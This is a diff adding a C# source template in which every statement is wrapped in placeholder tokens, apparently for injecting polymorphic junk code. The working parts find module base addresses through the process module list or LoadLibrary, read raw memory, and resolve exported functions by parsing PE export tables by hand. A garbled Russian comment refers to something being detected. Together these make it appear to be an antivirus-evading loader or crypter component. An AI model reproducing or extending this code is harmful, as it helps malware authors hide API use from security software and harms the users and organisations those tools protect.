+			    %$#@additionaltriggerGetInternalModuleBaseAddr6@#$%
+		        %$#@additionaltriggerGetInternalModuleBaseAddr7@#$%
+		        %$#@additionaltriggerGetInternalModuleBaseAddr8@#$%
+            }
+			%$#@additionaltriggerGetInternalModuleBaseAddr9@#$%
+		    %$#@additionaltriggerGetInternalModuleBaseAddr10@#$%
+		    %$#@additionaltriggerGetInternalModuleBaseAddr11@#$%
+            IntPtr %$#@basictriggerModuleBaseAddress@#$% = IntPtr.Zero;
+			%$#@additionaltriggerGetInternalModuleBaseAddr12@#$%
+		    %$#@additionaltriggerGetInternalModuleBaseAddr13@#$%
+		    %$#@additionaltriggerGetInternalModuleBaseAddr14@#$%
+            foreach (ProcessModule %$#@basictriggerProcModule@#$% in Process.GetCurrentProcess().Modules)
+            {
+			    %$#@additionaltriggerGetInternalModuleBaseAddr15@#$%
+		        %$#@additionaltriggerGetInternalModuleBaseAddr16@#$%
+		        %$#@additionaltriggerGetInternalModuleBaseAddr17@#$%
+                if (%$#@basictriggerProcModule@#$%.ModuleName.ToLower() == %$#@basictriggername12@#$%)
+                {
+			        %$#@additionaltriggerGetInternalModuleBaseAddr18@#$%
+		            %$#@additionaltriggerGetInternalModuleBaseAddr19@#$%
+		            %$#@additionaltriggerGetInternalModuleBaseAddr20@#$%
+                    return %$#@basictriggerProcModule@#$%.BaseAddress;
+			        %$#@additionaltriggerGetInternalModuleBaseAddr21@#$%
+		            %$#@additionaltriggerGetInternalModuleBaseAddr22@#$%
+		            %$#@additionaltriggerGetInternalModuleBaseAddr23@#$%
+                }
+			    %$#@additionaltriggerGetInternalModuleBaseAddr24@#$%
+		        %$#@additionaltriggerGetInternalModuleBaseAddr25@#$%
+		        %$#@additionaltriggerGetInternalModuleBaseAddr26@#$%
+            }
+			%$#@additionaltriggerGetInternalModuleBaseAddr0e@#$%
+		    %$#@additionaltriggerGetInternalModuleBaseAddr1e@#$%
+		    %$#@additionaltriggerGetInternalModuleBaseAddr2e@#$%
+			IntPtr %$#@basictriggerGetInternalModuleBaseAddr___00@#$% = IntPtr.Zero;
+			%$#@additionaltriggerGetInternalModuleBaseAddr3e@#$%
+		    %$#@additionaltriggerGetInternalModuleBaseAddr4e@#$%
+		    %$#@additionaltriggerGetInternalModuleBaseAddr5e@#$%
+			if ( true )
+			   {
+			   %$#@additionaltriggerGetInternalModuleBaseAddr6e@#$%
+		       %$#@additionaltriggerGetInternalModuleBaseAddr7e@#$%
+		       %$#@additionaltriggerGetInternalModuleBaseAddr8e@#$%
+			   %$#@basictriggerGetInternalModuleBaseAddr___00@#$% = %$#@basictriggerLoadLibrary@#$%(%$#@basictriggername12@#$%);
+			   %$#@additionaltriggerGetInternalModuleBaseAddr9e@#$%
+		       %$#@additionaltriggerGetInternalModuleBaseAddr10e@#$%
+		       %$#@additionaltriggerGetInternalModuleBaseAddr11e@#$%
+			   }
+			%$#@additionaltriggerGetInternalModuleBaseAddr12e@#$%
+		    %$#@additionaltriggerGetInternalModuleBaseAddr13e@#$%
+		    %$#@additionaltriggerGetInternalModuleBaseAddr14e@#$%
+            return %$#@basictriggerGetInternalModuleBaseAddr___00@#$%;
+        }
+	    %$#@betweentrigger747@#$%
+		%$#@betweentrigger748@#$%
+		%$#@betweentrigger749@#$%
+		%$#@betweentrigger750@#$%
+		%$#@betweentrigger751@#$%
+		%$#@betweentrigger752@#$%		
+        public static byte[] %$#@basictriggerReadByteArray0@#$%(IntPtr %$#@basictriggeradress@#$%, int %$#@basictriggersize08@#$%)
+        {
+			%$#@additionaltriggerReadByteArray0@#$%
+		    %$#@additionaltriggerReadByteArray1@#$%
+		    %$#@additionaltriggerReadByteArray2@#$%
+            byte[] %$#@basictriggerReturnArray@#$% = new byte[%$#@basictriggersize08@#$%];
+			%$#@additionaltriggerReadByteArray3@#$%
+		    %$#@additionaltriggerReadByteArray4@#$%
+		    %$#@additionaltriggerReadByteArray5@#$%
+			if ( true )
+			   {
+		       %$#@additionaltrigger_ESHBRSNSR_06@#$%
+			   %$#@additionaltrigger_ESHBRSNSR_07@#$%
+			   %$#@additionaltrigger_ESHBRSNSR_08@#$%
+			   System.Runtime.InteropServices.Marshal.Copy(%$#@basictriggeradress@#$%, %$#@basictriggerReturnArray@#$%, 0, %$#@basictriggersize08@#$%);
+		       %$#@additionaltrigger_ESHBRSNSR_09@#$%
+			   %$#@additionaltrigger_ESHBRSNSR_10@#$%
+			   %$#@additionaltrigger_ESHBRSNSR_11@#$%
+			   }
+            
+			%$#@additionaltriggerReadByteArray6@#$%
+		    %$#@additionaltriggerReadByteArray7@#$%
+		    %$#@additionaltriggerReadByteArray8@#$%
+			%$#@additionaltriggerReadByteArray0e@#$%
+		    %$#@additionaltriggerReadByteArray1e@#$%
+		    %$#@additionaltriggerReadByteArray2e@#$%
+            return %$#@basictriggerReturnArray@#$%;
+        }
+	    %$#@betweentrigger753@#$%
+		%$#@betweentrigger754@#$%
+		%$#@betweentrigger755@#$%
+		%$#@betweentrigger756@#$%
+		%$#@betweentrigger757@#$%
+		%$#@betweentrigger758@#$%		
+        public static Int64 %$#@basictriggerGetProcAddress1@#$%(Int64 %$#@basictriggerModuleAddress@#$%, string %$#@basictriggerExport@#$%)//çäåñü åñòü êàêîé òî äåòåêò
+        {
+			%$#@additionaltriggerGetProcAddress0@#$%
+		    %$#@additionaltriggerGetProcAddress1@#$%
+		    %$#@additionaltriggerGetProcAddress2@#$%
+            byte[] %$#@basictriggerIExportDir@#$% = new byte[0];
+			%$#@additionaltriggerGetProcAddress3@#$%
+		    %$#@additionaltriggerGetProcAddress4@#$%
+		    %$#@additionaltriggerGetProcAddress5@#$%
+            if (IntPtr.Size == 4)
+			    {
+			    %$#@additionaltriggerGetProcAddress6@#$%
+		        %$#@additionaltriggerGetProcAddress7@#$%
+		        %$#@additionaltriggerGetProcAddress8@#$%
+                %$#@basictriggerIExportDir@#$% = %$#@basictriggerReadByteArray0@#$%((IntPtr)(%$#@basictriggerModuleAddress@#$% + (Int64)Marshal.ReadInt32((IntPtr)(%$#@basictriggerModuleAddress@#$% + (Int64)Marshal.ReadInt32((IntPtr)(%$#@basictriggerModuleAddress@#$% + 60L)) + 120L)) + 24L), 16);
+			    %$#@additionaltriggerGetProcAddress9@#$%
+		        %$#@additionaltriggerGetProcAddress10@#$%
+		        %$#@additionaltriggerGetProcAddress11@#$%
+				}
+            if (IntPtr.Size == 8)
+			    {
+			    %$#@additionaltriggerGetProcAddress12@#$%
+		        %$#@additionaltriggerGetProcAddress13@#$%
+		        %$#@additionaltriggerGetProcAddress14@#$%
+                %$#@basictriggerIExportDir@#$% = %$#@basictriggerReadByteArray0@#$%((IntPtr)(%$#@basictriggerModuleAddress@#$% + (Int64)Marshal.ReadInt32((IntPtr)(%$#@basictriggerModuleAddress@#$% + (Int64)Marshal.ReadInt32((IntPtr)(%$#@basictriggerModuleAddress@#$% + 60L)) + 136L)) + 24L), 16);
+			    %$#@additionaltriggerGetProcAddress15@#$%
+		        %$#@additionaltriggerGetProcAddress16@#$%
+		        %$#@additionaltriggerGetProcAddress17@#$%
+				}
+            for (int %$#@basictriggeri36@#$% = 0; %$#@basictriggeri36@#$% < BitConverter.ToInt32(%$#@basictriggerIExportDir@#$%, 0); %$#@basictriggeri36@#$%++)
+            {
+				%$#@additionaltriggerGetProcAddress18@#$%
+		        %$#@additionaltriggerGetProcAddress19@#$%
+                int %$#@basictriggertpAddress@#$% = 0;
+				if ( true )
+				   {
+		           %$#@additionaltrigger_ESHBRSNSR_12@#$%
+			       %$#@additionaltrigger_ESHBRSNSR_13@#$%
+			       %$#@additionaltrigger_ESHBRSNSR_14@#$%
+				   %$#@basictriggertpAddress@#$% = Marshal.ReadInt32((IntPtr)((Int64)BitConverter.ToInt32(%$#@basictriggerIExportDir@#$%, 8) + %$#@basictriggerModuleAddress@#$% + (Int64)(%$#@basictriggeri36@#$% * 4)));
+		           %$#@additionaltrigger_ESHBRSNSR_15@#$%
+			       %$#@additionaltrigger_ESHBRSNSR_16@#$%
+			       %$#@additionaltrigger_ESHBRSNSR_17@#$%
+				   }
+				%$#@additionaltriggerGetProcAddress20@#$%
+		        %$#@additionaltriggerGetProcAddress21@#$%
+                string %$#@basictriggerApiString@#$% = "";
+				if ( true )
+				   {
+		           %$#@additionaltrigger_ESHBRSNSR_18@#$%
+			       %$#@additionaltrigger_ESHBRSNSR_19@#$%
+			       %$#@additionaltrigger_ESHBRSNSR_20@#$%
+				   %$#@basictriggerApiString@#$% = Encoding.ASCII.GetString(%$#@basictriggerReadByteArray0@#$%((IntPtr)(%$#@basictriggerModuleAddress@#$% + (Int64)%$#@basictriggertpAddress@#$%), 64)).Split(char.MinValue)[0];
+		           %$#@additionaltrigger_ESHBRSNSR_21@#$%
+			       %$#@additionaltrigger_ESHBRSNSR_22@#$%
+			       %$#@additionaltrigger_ESHBRSNSR_23@#$%
+				   }
+				%$#@additionaltriggerGetProcAddress22@#$%
+		        %$#@additionaltriggerGetProcAddress23@#$%
+                int %$#@basictriggerOrd@#$% = 0;
+				if ( true )
+				   {
+		           %$#@additionaltrigger_ESHBRSNSR_24@#$%
+			       %$#@additionaltrigger_ESHBRSNSR_25@#$%
+			       %$#@additionaltrigger_ESHBRSNSR_26@#$%
+				   %$#@basictriggerOrd@#$% = (int)BitConverter.ToInt16(%$#@basictriggerReadByteArray0@#$%((IntPtr)((Int64)BitConverter.ToInt32(%$#@basictriggerIExportDir@#$%, 12) + %$#@basictriggerModuleAddress@#$% + (Int64)(%$#@basictriggeri36@#$% * 2)), 2), 0);
+		           %$#@additionaltrigger_ESHBRSNSR_27@#$%
+			       %$#@additionaltrigger_ESHBRSNSR_28@#$%
+			       %$#@additionaltrigger_ESHBRSNSR_29@#$%
+				   }
+				%$#@additionaltriggerGetProcAddress24@#$%
+		        %$#@additionaltriggerGetProcAddress25@#$%
+                if (%$#@basictriggerApiString@#$% == %$#@basictriggerExport@#$%)
+                {
+				    %$#@additionaltriggerGetProcAddress26@#$%
+		            %$#@additionaltriggerGetProcAddress27@#$%
+				    %$#@additionaltriggerGetProcAddress28@#$%
+		            %$#@additionaltriggerGetProcAddress29@#$%
+					Int64 %$#@basictriggerGetProcAddress___00gh@#$%=0;
+			        %$#@additionaltriggerGetProcAddress3e@#$%
+		            %$#@additionaltriggerGetProcAddress4e@#$%
+		            %$#@additionaltriggerGetProcAddress5e@#$%
+					if ( true )
+					   {
+			           %$#@additionaltriggerGetProcAddress6e@#$%
+		               %$#@additionaltriggerGetProcAddress7e@#$%
+		               %$#@additionaltriggerGetProcAddress8e@#$%
+					   %$#@basictriggerGetProcAddress___00gh@#$% = (Int64)BitConverter.ToInt32(%$#@basictriggerReadByteArray0@#$%((IntPtr)((Int64)BitConverter.ToInt32(%$#@basictriggerIExportDir@#$%, 4) + %$#@basictriggerModuleAddress@#$% + (long)(%$#@basictriggerOrd@#$% * 4)), 4), 0) + %$#@basictriggerModuleAddress@#$%;
+			           %$#@additionaltriggerGetProcAddress9e@#$%
+		               %$#@additionaltriggerGetProcAddress10e@#$%
+		               %$#@additionaltriggerGetProcAddress11e@#$%
+					   }
+			        %$#@additionaltriggerGetProcAddress12e@#$%
+		            %$#@additionaltriggerGetProcAddress13e@#$%
+		            %$#@additionaltriggerGetProcAddress14e@#$%
+                    return %$#@basictriggerGetProcAddress___00gh@#$%;
+                }
+            }
+			%$#@additionaltriggerGetProcAddress0e@#$%
+		    %$#@additionaltriggerGetProcAddress1e@#$%
+		    %$#@additionaltriggerGetProcAddress2e@#$%
+            return 0L;
+        }
+	    %$#@betweentrigger759@#$%
+		%$#@betweentrigger760@#$%
+		%$#@betweentrigger761@#$%
+		%$#@betweentrigger762@#$%
+		%$#@betweentrigger763@#$%
+		%$#@betweentrigger764@#$%		
+    }
+    %$#@classtrigger36e@#$%
+    %$#@classtrigger37e@#$%
+	%$#@classtrigger38e@#$%
+	%$#@classtrigger39e@#$%
+	%$#@classtrigger40e@#$%
+	%$#@classtrigger41e@#$%
+    %$#@classtrigger42e@#$%
+    %$#@classtrigger43e@#$%
+	%$#@classtrigger44e@#$%
+	%$#@classtrigger45e@#$%
+	%$#@classtrigger46e@#$%
+	%$#@classtrigger47e@#$%
+}
